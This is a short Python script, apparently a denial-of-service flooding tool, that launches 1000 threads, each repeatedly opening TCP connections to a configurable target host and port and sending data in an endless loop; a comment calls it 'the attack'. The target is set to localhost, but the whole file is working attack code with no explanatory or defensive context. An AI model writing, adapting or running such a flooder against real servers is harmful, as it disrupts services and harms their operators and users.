import socket
import threading

target = "127.0.0.1"
port = 8080

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendall(b"Flooding data!")
            s.close()
        except:
            pass


if __name__ == "__main__":
    for i in range(1000):  # Number of threads for the attack
        thread = threading.Thread(target=flood)
        thread.start()
